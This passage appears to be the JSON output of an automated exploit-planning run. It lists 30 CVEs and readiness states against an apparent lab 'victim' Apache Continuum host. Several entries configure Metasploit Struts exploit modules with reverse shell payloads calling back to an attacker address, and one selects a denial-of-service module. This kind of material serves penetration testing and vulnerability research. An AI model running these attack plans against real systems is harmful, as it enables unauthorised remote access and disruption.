@@ -1,0 +1,1305 @@
+{
+  "all_included_cves_ready": false,
+  "form_path": "C:\\Users\\distortion\\Documents\\new-idea-kalama\\output-screening-run\\resolver\\forms\\attack_form_NZq9y_r1.yaml",
+  "per_cve": [
+    {
+      "cve_id": "CVE-2017-5638",
+      "issues": [],
+      "module": "exploit/multi/http/struts2_content_type_ognl",
+      "payload": "cmd/unix/reverse_bash",
+      "plan": {
+        "cve_id": "CVE-2017-5638",
+        "fixture_manifest": null,
+        "fixture_modules_root": null,
+        "fixture_namespace": null,
+        "fixture_sha256": null,
+        "fixture_source_path": null,
+        "loaded_module_path": null,
+        "module": "exploit/multi/http/struts2_content_type_ognl",
+        "module_options": [
+          [
+            "DOMAIN",
+            "WORKSTATION"
+          ],
+          [
+            "HTTP::Auth",
+            "auto"
+          ],
+          [
+            "HTTP::KrbOfferedEncryptionTypes",
+            "AES256,AES128,RC4-HMAC,DES-CBC-MD5,DES3-CBC-SHA1"
+          ],
+          [
+            "HTTPMethod",
+            "GET"
+          ],
+          [
+            "KrbCacheMode",
+            "read-write"
+          ],
+          [
+            "KrbClockSkew",
+            "0s"
+          ],
+          [
+            "RHOSTS",
+            "172.18.0.12"
+          ],
+          [
+            "RPORT",
+            8080
+          ],
+          [
+            "SSLVersion",
+            "Auto"
+          ],
+          [
+            "TARGETURI",
+            "/continuum/security/login.action"
+          ]
+        ],
+        "module_source": "stock",
+        "payload": "cmd/unix/reverse_bash",
+        "payload_options": [
+          [
+            "AutoVerifySession",
+            true
+          ],
+          [
+            "BashPath",
+            "bash"
+          ],
+          [
+            "LHOST",
+            "172.18.0.3"
+          ],
+          [
+            "LPORT",
+            4444
+          ],
+          [
+            "ReverseAllowProxy",
+            false
+          ],
+          [
+            "ReverseListenerThreaded",
+            false
+          ],
+          [
+            "ShellPath",
+            "sh"
+          ]
+        ],
+        "pre_attack_command": null,
+        "pre_attack_target": null,
+        "precondition_commands": [
+          "/opt/apache_continuum/apache-continuum-1.4.2/bin/continuum start",
+          "curl -sS -o /dev/null -w '%{http_code}' http://127.0.0.1:8080/continuum/security/login.action"
+        ],
+        "precondition_required": true,
+        "precondition_target": "victim",
+        "rank": 1,
+        "run_check": true,
+        "run_exploit": true,
+        "session_confirmation_expected": true,
+        "target_index": 0,
+        "target_name": "Universal"
+      },
+      "rank": 1,
+      "readiness": "READY_TO_EXECUTE",
+      "run_check": true,
+      "run_exploit": true,
+      "submitted": true,
+      "target_index": 0,
+      "target_name": "Universal",
+      "targeturi": "/continuum/security/login.action",
+      "validation_ready": true
+    },
+    {
+      "cve_id": "CVE-2022-22965",
+      "issues": [
+        {
+          "field": "invariant.target_selection",
+          "message": "Metasploit TARGET has not been confirmed",
+          "reason": "TARGET_REQUIRED"
+        },
+        {
+          "field": "invariant.targeturi",
+          "message": "TARGETURI requires confirmation",
+          "reason": "TARGETURI_REQUIRED"
+        },
+        {
+          "field": "invariant.module_options.KrbCacheMode",
+          "message": "required module option KrbCacheMode is unresolved",
+          "reason": "MODULE_OPTION_REQUIRED"
+        },
+        {
+          "field": "invariant.module_options.HTTP::Auth",
+          "message": "required module option HTTP::Auth is unresolved",
+          "reason": "MODULE_OPTION_REQUIRED"
+        },
+        {
+          "field": "invariant.module_options.KrbClockSkew",
+          "message": "required module option KrbClockSkew is unresolved",
+          "reason": "MODULE_OPTION_REQUIRED"
+        },
+        {
+          "field": "invariant.module_options.HTTP::KrbOfferedEncryptionTypes",
+          "message": "required module option HTTP::KrbOfferedEncryptionTypes is unresolved",
+          "reason": "MODULE_OPTION_REQUIRED"
+        },
+        {
+          "field": "invariant.module_options.SSLVersion",
+          "message": "required module option SSLVersion is unresolved",
+          "reason": "MODULE_OPTION_REQUIRED"
+        },
+        {
+          "field": "invariant.module_options.DOMAIN",
+          "message": "required module option DOMAIN is unresolved",
+          "reason": "MODULE_OPTION_REQUIRED"
+        },
+        {
+          "field": "invariant.module_options.PAYLOAD_PATH",
+          "message": "required module option PAYLOAD_PATH is unresolved",
+          "reason": "MODULE_OPTION_REQUIRED"
+        },
+        {
+          "field": "invariant.module_options.WritableDir",
+          "message": "required module option WritableDir is unresolved",
+          "reason": "MODULE_OPTION_REQUIRED"
+        },
+        {
+          "field": "environment.rport",
+          "message": "required RPORT environment binding is unresolved",
+          "reason": "ENVIRONMENT_RPORT_REQUIRED"
+        },
+        {
+          "field": "invariant.execution_protocol",
+          "message": "execution/check protocol has not been confirmed",
+          "reason": "EXECUTION_PROTOCOL_REQUIRED"
+        }
+      ],
+      "module": "exploit/multi/http/spring_framework_rce_spring4shell",
+      "payload": null,
+      "plan": null,
+      "rank": 2,
+      "readiness": "READY_FOR_CONFIRMATION",
+      "run_check": true,
+      "run_exploit": false,
+      "submitted": true,
+      "target_index": null,
+      "target_name": null,
+      "targeturi": null,
+      "validation_ready": false
+    },
+    {
+      "cve_id": "CVE-2020-17530",
+      "issues": [],
+      "module": "exploit/multi/http/struts2_multi_eval_ognl",
+      "payload": "cmd/unix/reverse_bash",
+      "plan": {
+        "cve_id": "CVE-2020-17530",
+        "fixture_manifest": null,
+        "fixture_modules_root": null,
+        "fixture_namespace": null,
+        "fixture_sha256": null,
+        "fixture_source_path": null,
+        "loaded_module_path": null,
+        "module": "exploit/multi/http/struts2_multi_eval_ognl",
+        "module_options": [
+          [
+            "CMDSTAGER::DELAY",
+            0.5
+          ],
+          [
+            "CVE",
+            "CVE-2020-17530"
+          ],
+          [
+            "DOMAIN",
+            "WORKSTATION"
+          ],
+          [
+            "HTTP::Auth",
+            "auto"
+          ],
+          [
+            "HTTP::KrbOfferedEncryptionTypes",
+            "AES256,AES128,RC4-HMAC,DES-CBC-MD5,DES3-CBC-SHA1"
+          ],
+          [
+            "HTTP::server_name",
+            "Apache"
+          ],
+          [
+            "KrbCacheMode",
+            "read-write"
+          ],
+          [
+            "KrbClockSkew",
+            "0s"
+          ],
+          [
+            "NAME",
+            "id"
+          ],
+          [
+            "RHOSTS",
+            "172.18.0.12"
+          ],
+          [
+            "RPORT",
+            8080
+          ],
+          [
+            "SRVPORT",
+            8080
+          ],
+          [
+            "SSLVersion",
+            "Auto"
+          ],
+          [
+            "TARGETURI",
+            "/continuum/"
+          ]
+        ],
+        "module_source": "stock",
+        "payload": "cmd/unix/reverse_bash",
+        "payload_options": [
+          [
+            "AutoVerifySession",
+            true
+          ],
+          [
+            "BashPath",
+            "bash"
+          ],
+          [
+            "LHOST",
+            "172.18.0.3"
+          ],
+          [
+            "LPORT",
+            4445
+          ],
+          [
+            "ReverseAllowProxy",
+            false
+          ],
+          [
+            "ReverseListenerThreaded",
+            false
+          ],
+          [
+            "ShellPath",
+            "sh"
+          ]
+        ],
+        "pre_attack_command": null,
+        "pre_attack_target": null,
+        "precondition_commands": [
+          "/opt/apache_continuum/apache-continuum-1.4.2/bin/continuum start",
+          "curl -sS -o /dev/null -w '%{http_code}' http://127.0.0.1:8080/continuum/security/login.action"
+        ],
+        "precondition_required": true,
+        "precondition_target": "victim",
+        "rank": 3,
+        "run_check": true,
+        "run_exploit": true,
+        "session_confirmation_expected": true,
+        "target_index": 0,
+        "target_name": "Unix Command"
+      },
+      "rank": 3,
+      "readiness": "READY_TO_EXECUTE",
+      "run_check": true,
+      "run_exploit": true,
+      "submitted": true,
+      "target_index": 0,
+      "target_name": "Unix Command",
+      "targeturi": "/continuum/",
+      "validation_ready": true
+    },
+    {
+      "cve_id": "CVE-2018-11776",
+      "issues": [],
+      "module": "exploit/multi/http/struts2_namespace_ognl",
+      "payload": "cmd/unix/reverse_bash",
+      "plan": {
+        "cve_id": "CVE-2018-11776",
+        "fixture_manifest": null,
+        "fixture_modules_root": null,
+        "fixture_namespace": null,
+        "fixture_sha256": null,
+        "fixture_source_path": null,
+        "loaded_module_path": null,
+        "module": "exploit/multi/http/struts2_namespace_ognl",
+        "module_options": [
+          [
+            "ACTION",
+            "groupSummary.action"
+          ],
+          [
+            "DOMAIN",
+            "WORKSTATION"
+          ],
+          [
+            "ENABLE_STATIC",
+            true
+          ],
+          [
+            "HEADER",
+            "X-Upqn"
+          ],
+          [
+            "HTTP::Auth",
+            "auto"
+          ],
+          [
+            "HTTP::KrbOfferedEncryptionTypes",
+            "AES256,AES128,RC4-HMAC,DES-CBC-MD5,DES3-CBC-SHA1"
+          ],
+          [
+            "HTTPMethod",
+            "GET"
+          ],
+          [
+            "KrbCacheMode",
+            "read-write"
+          ],
+          [
+            "KrbClockSkew",
+            "0s"
+          ],
+          [
+            "RHOSTS",
+            "172.18.0.12"
+          ],
+          [
+            "RPORT",
+            8080
+          ],
+          [
+            "SSLVersion",
+            "Auto"
+          ],
+          [
+            "TARGETURI",
+            "/continuum/"
+          ],
+          [
+            "TEMPFILE",
+            "mZQYkcSO"
+          ]
+        ],
+        "module_source": "stock",
+        "payload": "cmd/unix/reverse_bash",
+        "payload_options": [
+          [
+            "AutoVerifySession",
+            true
+          ],
+          [
+            "BashPath",
+            "bash"
+          ],
+          [
+            "LHOST",
+            "172.18.0.3"
+          ],
+          [
+            "LPORT",
+            4446
+          ],
+          [
+            "ReverseAllowProxy",
+            false
+          ],
+          [
+            "ReverseListenerThreaded",
+            false
+          ],
+          [
+            "ShellPath",
+            "sh"
+          ]
+        ],
+        "pre_attack_command": null,
+        "pre_attack_target": null,
+        "precondition_commands": [
+          "/opt/apache_continuum/apache-continuum-1.4.2/bin/continuum start",
+          "curl -sS -o /dev/null -w '%{http_code}' http://127.0.0.1:8080/continuum/security/login.action"
+        ],
+        "precondition_required": true,
+        "precondition_target": "victim",
+        "rank": 4,
+        "run_check": true,
+        "run_exploit": true,
+        "session_confirmation_expected": true,
+        "target_index": 0,
+        "target_name": "Automatic detection"
+      },
+      "rank": 4,
+      "readiness": "READY_TO_EXECUTE",
+      "run_check": true,
+      "run_exploit": true,
+      "submitted": true,
+      "target_index": 0,
+      "target_name": "Automatic detection",
+      "targeturi": "/continuum/",
+      "validation_ready": true
+    },
+    {
+      "cve_id": "CVE-2019-0230",
+      "issues": [],
+      "module": "exploit/multi/http/struts2_multi_eval_ognl",
+      "payload": "cmd/unix/reverse_bash",
+      "plan": {
+        "cve_id": "CVE-2019-0230",
+        "fixture_manifest": null,
+        "fixture_modules_root": null,
+        "fixture_namespace": null,
+        "fixture_sha256": null,
+        "fixture_source_path": null,
+        "loaded_module_path": null,
+        "module": "exploit/multi/http/struts2_multi_eval_ognl",
+        "module_options": [
+          [
+            "CMDSTAGER::DELAY",
+            0.5
+          ],
+          [
+            "CVE",
+            "CVE-2019-0230"
+          ],
+          [
+            "DOMAIN",
+            "WORKSTATION"
+          ],
+          [
+            "HTTP::Auth",
+            "auto"
+          ],
+          [
+            "HTTP::KrbOfferedEncryptionTypes",
+            "AES256,AES128,RC4-HMAC,DES-CBC-MD5,DES3-CBC-SHA1"
+          ],
+          [
+            "HTTP::server_name",
+            "Apache"
+          ],
+          [
+            "KrbCacheMode",
+            "read-write"
+          ],
+          [
+            "KrbClockSkew",
+            "0s"
+          ],
+          [
+            "NAME",
+            "id"
+          ],
+          [
+            "RHOSTS",
+            "172.18.0.12"
+          ],
+          [
+            "RPORT",
+            8080
+          ],
+          [
+            "SRVPORT",
+            8080
+          ],
+          [
+            "SSLVersion",
+            "Auto"
+          ],
+          [
+            "TARGETURI",
+            "/continuum/"
+          ]
+        ],
+        "module_source": "stock",
+        "payload": "cmd/unix/reverse_bash",
+        "payload_options": [
+          [
+            "AutoVerifySession",
+            true
+          ],
+          [
+            "BashPath",
+            "bash"
+          ],
+          [
+            "LHOST",
+            "172.18.0.3"
+          ],
+          [
+            "LPORT",
+            4447
+          ],
+          [
+            "ReverseAllowProxy",
+            false
+          ],
+          [
+            "ReverseListenerThreaded",
+            false
+          ],
+          [
+            "ShellPath",
+            "sh"
+          ]
+        ],
+        "pre_attack_command": null,
+        "pre_attack_target": null,
+        "precondition_commands": [
+          "/opt/apache_continuum/apache-continuum-1.4.2/bin/continuum start",
+          "curl -sS -o /dev/null -w '%{http_code}' http://127.0.0.1:8080/continuum/security/login.action"
+        ],
+        "precondition_required": true,
+        "precondition_target": "victim",
+        "rank": 5,
+        "run_check": true,
+        "run_exploit": true,
+        "session_confirmation_expected": true,
+        "target_index": 0,
+        "target_name": "Unix Command"
+      },
+      "rank": 5,
+      "readiness": "READY_TO_EXECUTE",
+      "run_check": true,
+      "run_exploit": true,
+      "submitted": true,
+      "target_index": 0,
+      "target_name": "Unix Command",
+      "targeturi": "/continuum/",
+      "validation_ready": true
+    },
+    {
+      "cve_id": "CVE-2017-12611",
+      "issues": [
+        {
+          "field": "invariant.module_selection",
+          "message": "no Metasploit module candidate was discovered",
+          "reason": "NO_MSF_MODULE"
+        },
+        {
+          "field": "invariant.execution_protocol",
+          "message": "execution/check protocol has not been confirmed",
+          "reason": "EXECUTION_PROTOCOL_REQUIRED"
+        }
+      ],
+      "module": null,
+      "plan": null,
+      "rank": 6,
+      "readiness": "UNRESOLVED",
+      "run_check": false,
+      "run_exploit": false,
+      "submitted": false,
+      "validation_ready": false
+    },
+    {
+      "cve_id": "CVE-2015-7501",
+      "issues": [
+        {
+          "field": "invariant.module_selection",
+          "message": "no Metasploit module candidate was discovered",
+          "reason": "NO_MSF_MODULE"
+        },
+        {
+          "field": "invariant.execution_protocol",
+          "message": "execution/check protocol has not been confirmed",
+          "reason": "EXECUTION_PROTOCOL_REQUIRED"
+        }
+      ],
+      "module": null,
+      "plan": null,
+      "rank": 7,
+      "readiness": "UNRESOLVED",
+      "run_check": false,
+      "run_exploit": false,
+      "submitted": false,
+      "validation_ready": false
+    },
+    {
+      "cve_id": "CVE-2021-31805",
+      "issues": [
+        {
+          "field": "invariant.module_selection",
+          "message": "no Metasploit module candidate was discovered",
+          "reason": "NO_MSF_MODULE"
+        },
+        {
+          "field": "invariant.execution_protocol",
+          "message": "execution/check protocol has not been confirmed",
+          "reason": "EXECUTION_PROTOCOL_REQUIRED"
+        }
+      ],
+      "module": null,
+      "plan": null,
+      "rank": 8,
+      "readiness": "UNRESOLVED",
+      "run_check": false,
+      "run_exploit": false,
+      "submitted": false,
+      "validation_ready": false
+    },
+    {
+      "cve_id": "CVE-2023-50164",
+      "issues": [
+        {
+          "field": "invariant.module_selection",
+          "message": "no Metasploit module candidate was discovered",
+          "reason": "NO_MSF_MODULE"
+        },
+        {
+          "field": "invariant.execution_protocol",
+          "message": "execution/check protocol has not been confirmed",
+          "reason": "EXECUTION_PROTOCOL_REQUIRED"
+        }
+      ],
+      "module": null,
+      "plan": null,
+      "rank": 9,
+      "readiness": "UNRESOLVED",
+      "run_check": false,
+      "run_exploit": false,
+      "submitted": false,
+      "validation_ready": false
+    },
+    {
+      "cve_id": "CVE-2024-53677",
+      "issues": [
+        {
+          "field": "invariant.module_selection",
+          "message": "no Metasploit module candidate was discovered",
+          "reason": "NO_MSF_MODULE"
+        },
+        {
+          "field": "invariant.execution_protocol",
+          "message": "execution/check protocol has not been confirmed",
+          "reason": "EXECUTION_PROTOCOL_REQUIRED"
+        }
+      ],
+      "module": null,
+      "plan": null,
+      "rank": 10,
+      "readiness": "UNRESOLVED",
+      "run_check": false,
+      "run_exploit": false,
+      "submitted": false,
+      "validation_ready": false
+    },
+    {
+      "cve_id": "CVE-2019-17571",
+      "issues": [
+        {
+          "field": "invariant.module_selection",
+          "message": "no Metasploit module candidate was discovered",
+          "reason": "NO_MSF_MODULE"
+        },
+        {
+          "field": "invariant.execution_protocol",
+          "message": "execution/check protocol has not been confirmed",
+          "reason": "EXECUTION_PROTOCOL_REQUIRED"
+        }
+      ],
+      "module": null,
+      "plan": null,
+      "rank": 11,
+      "readiness": "UNRESOLVED",
+      "run_check": false,
+      "run_exploit": false,
+      "submitted": false,
+      "validation_ready": false
+    },
+    {
+      "cve_id": "CVE-2022-23305",
+      "issues": [
+        {
+          "field": "invariant.module_selection",
+          "message": "no Metasploit module candidate was discovered",
+          "reason": "NO_MSF_MODULE"
+        },
+        {
+          "field": "invariant.execution_protocol",
+          "message": "execution/check protocol has not been confirmed",
+          "reason": "EXECUTION_PROTOCOL_REQUIRED"
+        }
+      ],
+      "module": null,
+      "plan": null,
+      "rank": 12,
+      "readiness": "UNRESOLVED",
+      "run_check": false,
+      "run_exploit": false,
+      "submitted": false,
+      "validation_ready": false
+    },
+    {
+      "cve_id": "CVE-2020-11023",
+      "issues": [
+        {
+          "field": "invariant.module_selection",
+          "message": "no Metasploit module candidate was discovered",
+          "reason": "NO_MSF_MODULE"
+        },
+        {
+          "field": "invariant.execution_protocol",
+          "message": "execution/check protocol has not been confirmed",
+          "reason": "EXECUTION_PROTOCOL_REQUIRED"
+        }
+      ],
+      "module": null,
+      "plan": null,
+      "rank": 13,
+      "readiness": "UNRESOLVED",
+      "run_check": false,
+      "run_exploit": false,
+      "submitted": false,
+      "validation_ready": false
+    },
+    {
+      "cve_id": "CVE-2016-1000031",
+      "issues": [
+        {
+          "field": "invariant.module_selection",
+          "message": "no Metasploit module candidate was discovered",
+          "reason": "NO_MSF_MODULE"
+        },
+        {
+          "field": "invariant.execution_protocol",
+          "message": "execution/check protocol has not been confirmed",
+          "reason": "EXECUTION_PROTOCOL_REQUIRED"
+        }
+      ],
+      "module": null,
+      "plan": null,
+      "rank": 14,
+      "readiness": "UNRESOLVED",
+      "run_check": false,
+      "run_exploit": false,
+      "submitted": false,
+      "validation_ready": false
+    },
+    {
+      "cve_id": "CVE-2016-1000027",
+      "issues": [
+        {
+          "field": "invariant.module_selection",
+          "message": "no Metasploit module candidate was discovered",
+          "reason": "NO_MSF_MODULE"
+        },
+        {
+          "field": "invariant.execution_protocol",
+          "message": "execution/check protocol has not been confirmed",
+          "reason": "EXECUTION_PROTOCOL_REQUIRED"
+        }
+      ],
+      "module": null,
+      "plan": null,
+      "rank": 15,
+      "readiness": "UNRESOLVED",
+      "run_check": false,
+      "run_exploit": false,
+      "submitted": false,
+      "validation_ready": false
+    },
+    {
+      "cve_id": "CVE-2022-23302",
+      "issues": [
+        {
+          "field": "invariant.module_selection",
+          "message": "no Metasploit module candidate was discovered",
+          "reason": "NO_MSF_MODULE"
+        },
+        {
+          "field": "invariant.execution_protocol",
+          "message": "execution/check protocol has not been confirmed",
+          "reason": "EXECUTION_PROTOCOL_REQUIRED"
+        }
+      ],
+      "module": null,
+      "plan": null,
+      "rank": 16,
+      "readiness": "UNRESOLVED",
+      "run_check": false,
+      "run_exploit": false,
+      "submitted": false,
+      "validation_ready": false
+    },
+    {
+      "cve_id": "CVE-2025-48976",
+      "issues": [
+        {
+          "field": "invariant.module_selection",
+          "message": "no Metasploit module candidate was discovered",
+          "reason": "NO_MSF_MODULE"
+        },
+        {
+          "field": "invariant.execution_protocol",
+          "message": "execution/check protocol has not been confirmed",
+          "reason": "EXECUTION_PROTOCOL_REQUIRED"
+        }
+      ],
+      "module": null,
+      "plan": null,
+      "rank": 17,
+      "readiness": "UNRESOLVED",
+      "run_check": false,
+      "run_exploit": false,
+      "submitted": false,
+      "validation_ready": false
+    },
+    {
+      "cve_id": "CVE-2014-0112",
+      "issues": [],
+      "module": "exploit/multi/http/struts_code_exec_classloader",
+      "payload": "linux/x86/shell_reverse_tcp",
+      "plan": {
+        "cve_id": "CVE-2014-0112",
+        "fixture_manifest": null,
+        "fixture_modules_root": null,
+        "fixture_namespace": null,
+        "fixture_sha256": null,
+        "fixture_source_path": null,
+        "loaded_module_path": null,
+        "module": "exploit/multi/http/struts_code_exec_classloader",
+        "module_options": [
+          [
+            "DOMAIN",
+            "WORKSTATION"
+          ],
+          [
+            "HTTP::Auth",
+            "auto"
+          ],
+          [
+            "HTTP::KrbOfferedEncryptionTypes",
+            "AES256,AES128,RC4-HMAC,DES-CBC-MD5,DES3-CBC-SHA1"
+          ],
+          [
+            "KrbCacheMode",
+            "read-write"
+          ],
+          [
+            "KrbClockSkew",
+            "0s"
+          ],
+          [
+            "RHOSTS",
+            "172.18.0.12"
+          ],
+          [
+            "RPORT",
+            8080
+          ],
+          [
+            "SMBDomain",
+            "WORKGROUP"
+          ],
+          [
+            "SMB_DELAY",
+            10
+          ],
+          [
+            "SRVPORT",
+            445
+          ],
+          [
+            "SSLVersion",
+            "Auto"
+          ],
+          [
+            "STRUTS_VERSION",
+            "2.x"
+          ],
+          [
+            "TARGETURI",
+            "/continuum/security/login.action"
+          ]
+        ],
+        "module_source": "stock",
+        "payload": "linux/x86/shell_reverse_tcp",
+        "payload_options": [
+          [
+            "AutoVerifySession",
+            true
+          ],
+          [
+            "CMD",
+            "/bin/sh"
+          ],
+          [
+            "LHOST",
+            "172.18.0.3"
+          ],
+          [
+            "LPORT",
+            4448
+          ],
+          [
+            "ReverseAllowProxy",
+            false
+          ],
+          [
+            "ReverseListenerThreaded",
+            false
+          ]
+        ],
+        "pre_attack_command": null,
+        "pre_attack_target": null,
+        "precondition_commands": [
+          "/opt/apache_continuum/apache-continuum-1.4.2/bin/continuum start",
+          "curl -sS -o /dev/null -w '%{http_code}' http://127.0.0.1:8080/continuum/security/login.action"
+        ],
+        "precondition_required": true,
+        "precondition_target": "victim",
+        "rank": 18,
+        "run_check": false,
+        "run_exploit": true,
+        "session_confirmation_expected": true,
+        "target_index": 1,
+        "target_name": "Linux"
+      },
+      "rank": 18,
+      "readiness": "READY_TO_EXECUTE",
+      "run_check": false,
+      "run_exploit": true,
+      "submitted": true,
+      "target_index": 1,
+      "target_name": "Linux",
+      "targeturi": "/continuum/security/login.action",
+      "validation_ready": true
+    },
+    {
+      "cve_id": "CVE-2022-23307",
+      "issues": [
+        {
+          "field": "invariant.module_selection",
+          "message": "no Metasploit module candidate was discovered",
+          "reason": "NO_MSF_MODULE"
+        },
+        {
+          "field": "invariant.execution_protocol",
+          "message": "execution/check protocol has not been confirmed",
+          "reason": "EXECUTION_PROTOCOL_REQUIRED"
+        }
+      ],
+      "module": null,
+      "plan": null,
+      "rank": 19,
+      "readiness": "UNRESOLVED",
+      "run_check": false,
+      "run_exploit": false,
+      "submitted": false,
+      "validation_ready": false
+    },
+    {
+      "cve_id": "CVE-2017-7658",
+      "issues": [
+        {
+          "field": "invariant.module_selection",
+          "message": "no Metasploit module candidate was discovered",
+          "reason": "NO_MSF_MODULE"
+        },
+        {
+          "field": "invariant.execution_protocol",
+          "message": "execution/check protocol has not been confirmed",
+          "reason": "EXECUTION_PROTOCOL_REQUIRED"
+        }
+      ],
+      "module": null,
+      "plan": null,
+      "rank": 20,
+      "readiness": "UNRESOLVED",
+      "run_check": false,
+      "run_exploit": false,
+      "submitted": false,
+      "validation_ready": false
+    },
+    {
+      "cve_id": "CVE-2016-3082",
+      "issues": [
+        {
+          "field": "invariant.module_selection",
+          "message": "no Metasploit module candidate was discovered",
+          "reason": "NO_MSF_MODULE"
+        },
+        {
+          "field": "invariant.execution_protocol",
+          "message": "execution/check protocol has not been confirmed",
+          "reason": "EXECUTION_PROTOCOL_REQUIRED"
+        }
+      ],
+      "module": null,
+      "plan": null,
+      "rank": 21,
+      "readiness": "UNRESOLVED",
+      "run_check": false,
+      "run_exploit": false,
+      "submitted": false,
+      "validation_ready": false
+    },
+    {
+      "cve_id": "CVE-2015-6420",
+      "issues": [
+        {
+          "field": "invariant.module_selection",
+          "message": "no Metasploit module candidate was discovered",
+          "reason": "NO_MSF_MODULE"
+        },
+        {
+          "field": "invariant.execution_protocol",
+          "message": "execution/check protocol has not been confirmed",
+          "reason": "EXECUTION_PROTOCOL_REQUIRED"
+        }
+      ],
+      "module": null,
+      "plan": null,
+      "rank": 22,
+      "readiness": "UNRESOLVED",
+      "run_check": false,
+      "run_exploit": false,
+      "submitted": false,
+      "validation_ready": false
+    },
+    {
+      "cve_id": "CVE-2017-7657",
+      "issues": [
+        {
+          "field": "invariant.module_selection",
+          "message": "no Metasploit module candidate was discovered",
+          "reason": "NO_MSF_MODULE"
+        },
+        {
+          "field": "invariant.execution_protocol",
+          "message": "execution/check protocol has not been confirmed",
+          "reason": "EXECUTION_PROTOCOL_REQUIRED"
+        }
+      ],
+      "module": null,
+      "plan": null,
+      "rank": 23,
+      "readiness": "UNRESOLVED",
+      "run_check": false,
+      "run_exploit": false,
+      "submitted": false,
+      "validation_ready": false
+    },
+    {
+      "cve_id": "CVE-2020-10683",
+      "issues": [
+        {
+          "field": "invariant.module_selection",
+          "message": "no Metasploit module candidate was discovered",
+          "reason": "NO_MSF_MODULE"
+        },
+        {
+          "field": "invariant.execution_protocol",
+          "message": "execution/check protocol has not been confirmed",
+          "reason": "EXECUTION_PROTOCOL_REQUIRED"
+        }
+      ],
+      "module": null,
+      "plan": null,
+      "rank": 24,
+      "readiness": "UNRESOLVED",
+      "run_check": false,
+      "run_exploit": false,
+      "submitted": false,
+      "validation_ready": false
+    },
+    {
+      "cve_id": "CVE-2016-4436",
+      "issues": [
+        {
+          "field": "invariant.module_selection",
+          "message": "no Metasploit module candidate was discovered",
+          "reason": "NO_MSF_MODULE"
+        },
+        {
+          "field": "invariant.execution_protocol",
+          "message": "execution/check protocol has not been confirmed",
+          "reason": "EXECUTION_PROTOCOL_REQUIRED"
+        }
+      ],
+      "module": null,
+      "plan": null,
+      "rank": 25,
+      "readiness": "UNRESOLVED",
+      "run_check": false,
+      "run_exploit": false,
+      "submitted": false,
+      "validation_ready": false
+    },
+    {
+      "cve_id": "CVE-2017-1000487",
+      "issues": [
+        {
+          "field": "invariant.module_selection",
+          "message": "no Metasploit module candidate was discovered",
+          "reason": "NO_MSF_MODULE"
+        },
+        {
+          "field": "invariant.execution_protocol",
+          "message": "execution/check protocol has not been confirmed",
+          "reason": "EXECUTION_PROTOCOL_REQUIRED"
+        }
+      ],
+      "module": null,
+      "plan": null,
+      "rank": 26,
+      "readiness": "UNRESOLVED",
+      "run_check": false,
+      "run_exploit": false,
+      "submitted": false,
+      "validation_ready": false
+    },
+    {
+      "cve_id": "CVE-2014-0050",
+      "issues": [
+        {
+          "field": "invariant.targeturi",
+          "message": "TARGETURI requires confirmation",
+          "reason": "TARGETURI_REQUIRED"
+        },
+        {
+          "field": "invariant.module_options.KrbCacheMode",
+          "message": "required module option KrbCacheMode is unresolved",
+          "reason": "MODULE_OPTION_REQUIRED"
+        },
+        {
+          "field": "invariant.module_options.HTTP::Auth",
+          "message": "required module option HTTP::Auth is unresolved",
+          "reason": "MODULE_OPTION_REQUIRED"
+        },
+        {
+          "field": "invariant.module_options.KrbClockSkew",
+          "message": "required module option KrbClockSkew is unresolved",
+          "reason": "MODULE_OPTION_REQUIRED"
+        },
+        {
+          "field": "invariant.module_options.HTTP::KrbOfferedEncryptionTypes",
+          "message": "required module option HTTP::KrbOfferedEncryptionTypes is unresolved",
+          "reason": "MODULE_OPTION_REQUIRED"
+        },
+        {
+          "field": "invariant.module_options.SSLVersion",
+          "message": "required module option SSLVersion is unresolved",
+          "reason": "MODULE_OPTION_REQUIRED"
+        },
+        {
+          "field": "invariant.module_options.DOMAIN",
+          "message": "required module option DOMAIN is unresolved",
+          "reason": "MODULE_OPTION_REQUIRED"
+        },
+        {
+          "field": "invariant.module_options.RLIMIT",
+          "message": "required module option RLIMIT is unresolved",
+          "reason": "MODULE_OPTION_REQUIRED"
+        },
+        {
+          "field": "environment.rport",
+          "message": "required RPORT environment binding is unresolved",
+          "reason": "ENVIRONMENT_RPORT_REQUIRED"
+        },
+        {
+          "field": "invariant.execution_protocol",
+          "message": "execution/check protocol has not been confirmed",
+          "reason": "EXECUTION_PROTOCOL_REQUIRED"
+        }
+      ],
+      "module": "auxiliary/dos/http/apache_commons_fileupload_dos",
+      "payload": null,
+      "plan": null,
+      "rank": 27,
+      "readiness": "READY_FOR_CONFIRMATION",
+      "run_check": false,
+      "run_exploit": true,
+      "submitted": true,
+      "target_index": null,
+      "target_name": null,
+      "targeturi": null,
+      "validation_ready": false
+    },
+    {
+      "cve_id": "CVE-2021-44906",
+      "issues": [
+        {
+          "field": "invariant.module_selection",
+          "message": "no Metasploit module candidate was discovered",
+          "reason": "NO_MSF_MODULE"
+        },
+        {
+          "field": "invariant.execution_protocol",
+          "message": "execution/check protocol has not been confirmed",
+          "reason": "EXECUTION_PROTOCOL_REQUIRED"
+        }
+      ],
+      "module": null,
+      "plan": null,
+      "rank": 28,
+      "readiness": "UNRESOLVED",
+      "run_check": false,
+      "run_exploit": false,
+      "submitted": false,
+      "validation_ready": false
+    },
+    {
+      "cve_id": "CVE-2021-4104",
+      "issues": [
+        {
+          "field": "invariant.module_selection",
+          "message": "no Metasploit module candidate was discovered",
+          "reason": "NO_MSF_MODULE"
+        },
+        {
+          "field": "invariant.execution_protocol",
+          "message": "execution/check protocol has not been confirmed",
+          "reason": "EXECUTION_PROTOCOL_REQUIRED"
+        }
+      ],
+      "module": null,
+      "plan": null,
+      "rank": 29,
+      "readiness": "UNRESOLVED",
+      "run_check": false,
+      "run_exploit": false,
+      "submitted": false,
+      "validation_ready": false
+    },
+    {
+      "cve_id": "CVE-2021-3918",
+      "issues": [
+        {
+          "field": "invariant.module_selection",
+          "message": "no Metasploit module candidate was discovered",
+          "reason": "NO_MSF_MODULE"
+        },
+        {
+          "field": "invariant.execution_protocol",
+          "message": "execution/check protocol has not been confirmed",
+          "reason": "EXECUTION_PROTOCOL_REQUIRED"
+        }
+      ],
+      "module": null,
+      "plan": null,
+      "rank": 30,
+      "readiness": "UNRESOLVED",
+      "run_check": false,
+      "run_exploit": false,
+      "submitted": false,
+      "validation_ready": false
+    }
+  ],
+  "resolver_path": "C:\\Users\\distortion\\Documents\\new-idea-kalama\\output-screening-run\\resolver\\resolver_2026-09-08_NZq9y.json",
+  "run_id": "NZq9y",
+  "state_path": "C:\\Users\\distortion\\Documents\\new-idea-kalama\\output-screening-run\\state\\run_NZq9y.json",
